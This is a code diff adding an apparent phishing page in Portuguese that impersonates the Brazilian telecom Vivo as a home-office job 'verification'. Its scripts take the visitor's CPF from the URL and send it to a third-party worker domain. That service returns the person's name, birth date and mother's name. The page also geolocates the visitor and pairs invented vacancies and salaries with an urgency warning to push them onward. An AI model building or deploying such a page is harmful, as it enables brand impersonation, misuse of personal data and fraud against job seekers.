@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vivo – Verificação</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+</head>
+<body class="bg-gray-50">
+
+  <!-- Header -->
+  <header class="flex items-center justify-between bg-white px-6 py-4 shadow rounded-lg max-w-3xl mx-auto mt-6 border-b-4 border-purple-600">
+    <img src="image/vivo.png" alt="Fify Digital logo" class="h-8 w-auto">
+
+    <div class="flex items-center space-x-3">
+      <div class="text-right text-sm">
+        <div id="header-nome" class="font-semibold text-gray-800"></div>
+        <div class="text-gray-500" id="header-cpf"></div>
+      </div>
+      <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center">
+        <svg class="w-5 h-5 text-gray-500" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
+        </svg>
+      </div>
+    </div>
+  </header>
+ <!-- Script de API CPF -->
+  <script>
+    const params = new URLSearchParams(location.search)
+    const wpp  = params.get('whatsapp') || '—'
+    const mail = params.get('email')    || '—'
+    const cpfRaw  = params.get('cpf') || ''
+    const cpfOnly = cpfRaw.replace(/\D/g, '')
+
+    $('#whatsapp').text(wpp)
+    $('#email').text(mail)
+    $('#cpf').text(cpfRaw)
+    $('#header-cpf').text(cpfRaw)
+
+    if (cpfOnly.length === 11) {
+      fetch(`https://apicpf2.legendastiktok770.workers.dev?cpf=${cpfOnly}`)
+        .then(r => r.json())
+        .then(json => {
+          if (json.dados?.length) {
+            const d = json.dados[0]
+            // Atualiza dados na seção "Dados do Candidato"
+            $('#apiData').html(`
+              <p><strong>Nome:</strong> ${d.NOME}</p>
+              <p><strong>Nascimento:</strong> ${d.NASC}</p>
+              <p><strong>Nome da Mãe:</strong> ${d.NOME_MAE}</p>
+            `)
+            // Atualiza o nome no header conforme o CPF
+            $('#header-nome').text(d.NOME)
+          } else {
+            $('#apiData').text('Nenhum dado encontrado.')
+          }
+        })
+        .catch(() => {
+          $('#apiData').text('Erro ao consultar API.')
+        })
+    }
+  </script>
+
+<!-- Verificações e Dados -->
+<main class="max-w-3xl mx-auto mt-6 space-y-6 px-6">
+  <!-- Etapas de verificação -->
+  <div class="bg-white p-4 rounded-lg shadow flex items-start gap-3 animate-pulse" id="verificacao-box">
+    <div class="text-blue-600 mt-1" id="verificacao-icon">
+      <svg class="w-5 h-5 animate-spin" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v4m0 8v4m4-4h4m-8 0H4m4-4H4m8 0h4"/>
+      </svg>
+    </div>
+    <p id="verificacao-text"><strong class="font-medium text-gray-800">Verificando</strong> se você está dentro do perfil desejado...</p>
+  </div>
+
+  <div class="bg-white p-4 rounded-lg shadow flex items-start gap-3 animate-pulse" id="checagem-box">
+    <div class="text-blue-600 mt-1" id="checagem-icon">
+      <svg class="w-5 h-5 animate-spin" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v4m0 8v4m4-4h4m-8 0H4m4-4H4m8 0h4"/>
+      </svg>
+    </div>
+    <div>
+      <p id="checagem-text"><strong class="font-medium text-gray-800">Checando</strong> disponibilidade de vagas na sua região...</p>
+      <p id="resultado-vagas" class="text-black-600 mt-1 font-semibold hidden">✔ Temos 5 vagas disponíveis na sua região!</p>
+    </div>
+    
+  </div>
+<!-- Preferência de horário -->
+<div class="bg-white p-6 rounded-xl shadow-md hidden" id="horario-box">
+  <h3 class="text-lg font-bold text-gray-800 mb-4">🕒 Escolha o horário ideal para trabalhar:</h3>
+  <form class="grid gap-3" id="form-horario">
+
+    <label for="hora-manha" class="opcao-horario flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="hora-manha" type="radio" name="horario" value="manha" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-horario">Manhã (08:00 – 12:00)</span>
+      </div>
+      <span class="text-sm text-gray-500">(1 vaga)</span>
+    </label>
+
+    <label for="hora-tarde" class="opcao-horario flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="hora-tarde" type="radio" name="horario" value="tarde" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-horario">Tarde (13:00 – 17:00)</span>
+      </div>
+      <span class="text-sm text-gray-500">(1 vaga)</span>
+    </label>
+
+    <label for="hora-noite" class="opcao-horario flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="hora-noite" type="radio" name="horario" value="noite" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-horario">Noite (18:00 – 22:00)</span>
+      </div>
+      <span class="text-sm text-gray-500">(2 vagas)</span>
+    </label>
+
+    <label for="hora-integral" class="opcao-horario flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="hora-integral" type="radio" name="horario" value="integral" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-horario">Horário Integral (08:00 – 18:00)</span>
+      </div>
+      <span class="text-sm text-gray-500">(1 vaga)</span>
+    </label>
+  </form>
+</div>
+
+<!-- Estilo customizado -->
+<style>
+  .bg-gradient-horario {
+    background: linear-gradient(to right, #a855f7 0%, #c084fc 50%, transparent 100%);
+    border-color: #a855f7 !important;
+  }
+</style>
+
+<!-- Script para aplicar o efeito ao selecionar -->
+<script>
+  const horarios = document.querySelectorAll('input[name="horario"]');
+  const horarioLabels = document.querySelectorAll('.opcao-horario');
+
+  horarios.forEach(horario => {
+    horario.addEventListener('change', () => {
+      horarioLabels.forEach(label => {
+        label.classList.remove('bg-gradient-horario');
+        label.querySelector('.texto-horario').classList.remove('font-bold');
+      });
+
+      const selecionado = horario.closest('label');
+      selecionado.classList.add('bg-gradient-horario');
+      selecionado.querySelector('.texto-horario').classList.add('font-bold');
+    });
+  });
+</script>
+
+
+<!-- Estilo personalizado -->
+<style>
+  .bg-gradient-selected {
+    background: linear-gradient(to right, #a855f7 0%, #c084fc 50%, transparent 100%);
+    border-color: #a855f7 !important;
+  }
+</style>
+
+<!-- Script para aplicar o degradê na seleção -->
+<script>
+  const radios = document.querySelectorAll('input[name="horario"]');
+  const labels = document.querySelectorAll('.opcao-horario');
+
+  radios.forEach(radio => {
+    radio.addEventListener('change', () => {
+      labels.forEach(label => label.classList.remove('bg-gradient-selected'));
+      const selectedLabel = radio.closest('label');
+      selectedLabel.classList.add('bg-gradient-selected');
+    });
+  });
+</script>
+
+
+<!-- Bloco: Imagem + Texto (inicialmente escondido) -->
+<div id="bloco-imagem-texto" class="flex flex-col md:flex-row items-center bg-white rounded-xl shadow-md p-6 gap-6 mb-6 hidden">
+  <!-- Imagem -->
+  <div class="md:w-1/2 w-full">
+    <img src="image/download-_1_.png" alt="Descrição da imagem" class="rounded-lg w-full h-auto">
+  </div>
+
+  <!-- Texto -->
+  <div class="md:w-1/2 w-full text-gray-800">
+    <h2 class="text-xl font-bold mb-2">O Que Você Precisa Para Trabalhar Conosco</h2>
+    <p class="text-gray-600 mb-3">
+      Buscamos profissionais comprometidos e qualificados para compor nossa equipe de prestadores de serviços. Veja abaixo os requisitos básicos:
+    </p>
+    <ul class="text-gray-600 mb-3 list-disc list-inside">
+      <li>Saber usar aplicativos de mensagem e e-mail</li>
+      <li>Facilidade para conversar e explicar coisas de forma clara</li>
+      <li>Gosta de trabalhos manuais simples</li>
+      <li>Ser organizado e saber anotar informações</li>
+      <li>Seguir instruções simples de um manual</li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+      document.getElementById('bloco-imagem-texto').classList.remove('hidden');
+    }, 3500);
+  });
+</script>
+
+
+<!-- Bloco: Oportunidades Separado -->
+ 
+<!-- Vagas disponíveis (inicialmente escondido) -->
+<div id="bloco-oportunidades" class="bg-white p-6 rounded-xl shadow-md hidden">
+  <h3 class="text-lg font-bold text-gray-800 mb-4">📌 Vagas disponíveis (Home Office)</h3>
+  <form class="grid gap-4" id="form-oportunidade">
+
+    <label for="op-chat" class="opcao-vaga flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="op-chat" type="radio" name="oportunidade" value="chat" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-vaga">Atendente de Chat</span>
+      </div>
+      <span class="text-sm text-gray-500">(3 vagas)</span>
+    </label>
+
+    <label for="op-agendamento" class="opcao-vaga flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="op-agendamento" type="radio" name="oportunidade" value="agendamento" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-vaga">Agendamento de Visitas Técnicas</span>
+      </div>
+      <span class="text-sm text-gray-500">(2 vagas)</span>
+    </label>
+
+    <label for="op-suporte" class="opcao-vaga flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="op-suporte" type="radio" name="oportunidade" value="suporte" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-vaga">Suporte ao Cliente</span>
+      </div>
+      <span class="text-sm text-gray-500">(4 vagas)</span>
+    </label>
+
+    <label for="op-consultor" class="opcao-vaga flex items-center justify-between p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition">
+      <div class="flex items-center gap-3">
+        <input id="op-consultor" type="radio" name="oportunidade" value="consultor" class="accent-purple-600 hidden" />
+        <span class="text-gray-700 texto-vaga">Consultor Comercial</span>
+      </div>
+      <span class="text-sm text-gray-500">(1 vaga)</span>
+    </label>
+  </form>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+      document.getElementById('bloco-oportunidades').classList.remove('hidden');
+    }, 3500);
+  });
+</script>
+
+
+<!-- Estilo customizado para o degradê -->
+<style>
+  .bg-gradient-vaga {
+    background: linear-gradient(to right, #a855f7 0%, #c084fc 50%, transparent 100%);
+    border-color: #a855f7 !important;
+  }
+</style>
+
+<!-- Script para aplicar o efeito ao selecionar -->
+<script>
+  const vagas = document.querySelectorAll('input[name="oportunidade"]');
+  const vagasLabels = document.querySelectorAll('.opcao-vaga');
+
+  vagas.forEach(vaga => {
+    vaga.addEventListener('change', () => {
+      vagasLabels.forEach(label => {
+        label.classList.remove('bg-gradient-vaga');
+        label.querySelector('.texto-vaga').classList.remove('font-bold');
+      });
+
+      const selecionado = vaga.closest('label');
+      selecionado.classList.add('bg-gradient-vaga');
+      selecionado.querySelector('.texto-vaga').classList.add('font-bold');
+    });
+  });
+</script>
+
+
+  <!-- Descrição da vaga -->
+  <div id="descricao-vaga" class="mt-6 text-sm text-gray-700 bg-gray-50 border-l-4 border-purple-400 p-4 rounded-lg hidden"></div>
+</div>
+
+<script>
+  const descricoes = {
+    chat: "💬 Como atendente de chat, você responderá clientes em tempo real via WhatsApp ou plataforma da empresa, tirando dúvidas e orientando sobre serviços.",
+    agendamento: "📅 Nesta função, você será responsável por ligar para clientes e agendar visitas técnicas em domicílio com base na agenda dos técnicos disponíveis.",
+    suporte: "🛠️ Como analista de suporte, seu papel será auxiliar clientes com problemas técnicos relacionados à internet, TV ou telefone. Você contará com scripts e treinamento.",
+    consultor: "📈 Nesta vaga, você irá trabalhar com vendas consultivas, apresentando planos e soluções personalizadas. Comissões e bônus por metas alcançadas."
+  }
+
+  document.querySelectorAll('input[name="oportunidade"]').forEach(radio => {
+    radio.addEventListener('change', () => {
+      const valor = radio.value;
+      const box = document.getElementById("descricao-vaga");
+      box.classList.remove("hidden");
+      box.textContent = descricoes[valor] || "";
+    });
+  });
+</script>
+
+
+
+<script>
+  setTimeout(() => {
+    $('#verificacao-box').removeClass('animate-pulse');
+    $('#verificacao-icon').html(`
+      <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+      </svg>
+    `);
+  }, 2000);
+
+  setTimeout(() => {
+    $('#checagem-box').removeClass('animate-pulse');
+    $('#checagem-icon').html(`
+      <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+      </svg>
+    `);
+    $('#resultado-vagas').removeClass('hidden');
+    $('#btn-contratacao').removeClass('hidden');
+    $('#horario-box').removeClass('hidden');
+  }, 3500);
+
+  const salarios = {
+    manha: 'R$ 2.900 - R$ 3.550 / mês',
+    tarde: 'R$ 3.000 - R$ 3.550 / mês',
+    noite: 'R$ 3.550 - R$ 4.100 / mês',
+    integral: 'R$ 3.800 - R$ 5.240 / mês'
+  };
+
+  document.querySelectorAll('input[name="horario"]').forEach(input => {
+    input.addEventListener('change', function () {
+      const salario = salarios[this.value] || 'R$ 3.800 - R$ 6.500 / mês';
+      document.getElementById('valor-salario').textContent = salario;
+    });
+  });
+
+</script>
+
+
+
+
+  <!-- Dados do Contratante -->
+  <div class="bg-white border rounded-xl p-6 shadow-md">
+    <h2 class="text-lg font-semibold text-gray-700 mb-4 flex items-center gap-2">📄 Dados do Cadidato</h2>
+  
+    <div id="apiData" class="mt-3 text-sm text-gray-700"></div>
+  </div>
+
+  <!-- Aviso -->
+  <div class="bg-orange-100 text-orange-800 border-l-4 border-orange-500 p-4 rounded-md shadow">
+    ⚠️ Devido à alta demanda. Recomendamos prosseguir com o processo o mais rápido possível.
+  </div>
+
+<!-- Texto informativo fixo -->
+<div class="text-center mt-4">
+  <p class="text-sm text-purple-700 font-medium">
+    ℹ️ Informações sobre a análise automática
+  </p>
+</div>
+
+<!-- Mensagem visível diretamente -->
+<div class="mt-2 text-center text-xs text-gray-600 bg-gray-50 border border-purple-200 p-3 rounded-lg max-w-md mx-auto">
+  Ao enviar essas respostas, você concorda que um sistema automatizado irá analisá-las para determinar se você se encaixa no perfil ideal para este tipo de trabalho.
+</div>
+
+
+<!-- Botão de avançar para analise/suporte.html -->
+<div class="text-center mt-6">
+  <button
+    onclick="window.location.href='../verificacao/verificacao.html';"
+    class="bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium px-6 py-2 rounded-md shadow-sm transition"
+    id="btn-avancar"
+  >
+    Avançar no Cadastro
+  </button>
+</div>
+
+
+
+
+
+  
+  
+</main>
+
+<!-- Script de verificação e localização -->
+<script>
+  setTimeout(() => {
+    $('#verificacao-box').removeClass('animate-pulse');
+    $('#verificacao-icon').html(`
+      <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+      </svg>
+    `);
+  }, 2000);
+
+  setTimeout(() => {
+    $('#checagem-box').removeClass('animate-pulse');
+    $('#checagem-icon').html(`
+      <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+      </svg>
+    `);
+    $('#resultado-vagas').removeClass('hidden');
+  }, 3500);
+
+ fetch("https://ipinfo.io/json")
+
+    .then(response => response.json())
+    .then(data => {
+      const cidade = data.city;
+      const estado = data.region;
+      const regiao = `${cidade} - ${estado}`;
+      $('#resultado-vagas').html(`✔ Temos 5 vagas disponíveis na sua cidade: <strong>${regiao}</strong>`);
+    })
+    .catch(() => {
+      $('#resultado-vagas').text('✔ Temos 5 vagas disponíveis na sua região!');
+    });
+</script>
+
+<!-- Script de API CPF -->
+<script>
+  const params = new URLSearchParams(location.search)
+  const wpp  = params.get('whatsapp') || '—'
+  const mail = params.get('email')    || '—'
+  const cpf  = (params.get('cpf')||'').replace(/\D/g, '')
+
+  $('#whatsapp').text(wpp)
+  $('#email').text(mail)
+  $('#cpf').text(params.get('cpf'))
+
+  if (cpf.length === 11) {
+    fetch(`https://apicpf2.legendastiktok770.workers.dev?cpf=${cpf}`)
+      .then(r => r.json())
+      .then(json => {
+        if (json.dados?.length) {
+          const d = json.dados[0]
+          $('#apiData').html(`
+            <p><strong>Nome:</strong> ${d.NOME}</p>
+            <p><strong>Nascimento:</strong> ${d.NASC}</p>
+            <p><strong>Nome da Mãe:</strong> ${d.NOME_MAE}</p>
+          `)
+        } else {
+          $('#apiData').text('Nenhum dado encontrado.')
+        }
+      })
+      .catch(() => $('#apiData').text('Erro ao consultar API.'))
+  }
+</script>
+
+</body>
+<!-- Rodapé no estilo Vivo full-width -->
+<footer class="w-full bg-gray-50 text-gray-800">
+  <div class="container mx-auto px-4 py-10">
+    <!-- Links + ícones sociais -->
+    <div class="flex flex-col md:flex-row md:justify-between">
+      
+      <!-- Lista de links -->
+      <ul class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-2 text-sm">
+        <li><a href="#" class="hover:underline">Telefones de atendimento</a></li>
+        <li><a href="#" class="hover:underline">Fale Conosco</a></li>
+        <li><a href="#" class="hover:underline">Comunicados</a></li>
+        <li><a href="#" class="hover:underline">Contratos e Regulamentos</a></li>
+        <li><a href="#" class="hover:underline">Ouvidoria</a></li>
+        <li><a href="#" class="hover:underline">A Vivo</a></li>
+        <li><a href="#" class="hover:underline">Carreiras</a></li>
+        <li><a href="#" class="hover:underline">Telefônica Brasil</a></li>
+        <li><a href="#" class="hover:underline">Acessibilidade</a></li>
+        <li><a href="#" class="hover:underline">Conselhos de usuários</a></li>
+        <li><a href="#" class="hover:underline">Código de Defesa do Consumidor</a></li>
+      </ul>
+      
+      <!-- Ícones sociais -->
+      <div class="flex space-x-4 mt-6 md:mt-0">
+        <a href="#" aria-label="Facebook" class="hover:opacity-75">
+          <img src="image/facebook.png" alt="Facebook" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="Instagram" class="hover:opacity-75">
+          <img src="image/instagram.png" alt="Instagram" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="YouTube" class="hover:opacity-75">
+          <img src="image/youtube.png" alt="YouTube" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="X" class="hover:opacity-75">
+          <img src="image/twitter.png" alt="X" class="w-6 h-6">
+        </a>
+      </div>
+    </div>
+
+    <!-- Copyright e links auxiliares -->
+    <div class="border-t border-gray-300 mt-8 pt-4 text-xs flex flex-col md:flex-row justify-between items-center">
+      <span>Copyright 2025 © Vivo. Todos os direitos reservados.</span>
+      <div class="space-x-4 mt-2 md:mt-0">
+        <a href="#" class="hover:underline">Política de Privacidade</a>
+        <a href="#" class="hover:underline">Decreto 6.532/2008</a>
+      </div>
+    </div>
+
+       <!-- Tagline -->
+    <div class="mt-4 text-xs text-center">
+      <span class="font-semibold uppercase">VIVA TUDO</span><br>
+      5G, Ultra Banda Larga, HDTV, Voz e mais.
+    </div>
+    <!-- Imagem abaixo da tagline -->
+    <div class="mt-6 text-center">
+      <img src="image/footer-viva-tudo-808x480.svg" alt="Por que escolher a Vivo" class="mx-auto w-82 md:w-82">
+    </div>
+  </div>
+
+</footer>
+</html>
